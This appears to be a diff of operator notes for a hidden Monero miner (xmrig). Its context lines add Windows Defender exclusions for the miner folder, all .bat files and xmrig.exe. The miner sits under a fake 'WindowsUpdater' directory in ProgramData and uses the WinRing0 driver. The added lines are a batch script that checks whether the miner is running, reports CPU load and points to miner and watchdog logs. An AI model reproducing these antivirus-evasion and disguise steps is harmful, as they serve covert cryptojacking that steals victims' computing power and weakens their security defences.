@@ -1,11 +1,8 @@
 Verify MSR:
-
 sc query WinRing0_1_2_0
- 
 
 
 check miner log:
-
 type "%ProgramData%\WindowsUpdater\miner.log" | find "MSR"
 
 
@@ -37,3 +34,26 @@ Add-MpPreference -ExclusionPath "$((Get-Location).Path)\miner_src"
 # Add file exclusions
 Add-MpPreference -ExclusionExtension ".bat"
 Add-MpPreference -ExclusionProcess "xmrig.exe"
+
+
+
+to check:
+@echo off
+title Miner Status Check
+color 0A
+echo Checking if Monero miner is running...
+echo.
+tasklist /fi "IMAGENAME eq xmrig.exe" 2>nul | find /i "xmrig.exe" >nul
+if %errorlevel% equ 0 (
+    echo [✔] Miner (xmrig.exe) is RUNNING.
+    echo Checking CPU usage and hashrate...
+    for /f "tokens=2 delims==" %%a in ('wmic cpu get loadpercentage /value ^| find "="') do set "CPU_USAGE=%%a"
+    echo CPU Usage: !CPU_USAGE!%%
+    echo Check hashrate in C:\ProgramData\WindowsUpdater\miner.log
+) else (
+    echo [!] Miner (xmrig.exe) is NOT running.
+    echo Check C:\ProgramData\WindowsUpdater\watchdog.log for errors.
+)
+echo.
+echo Press any key to exit...
+pause >nul
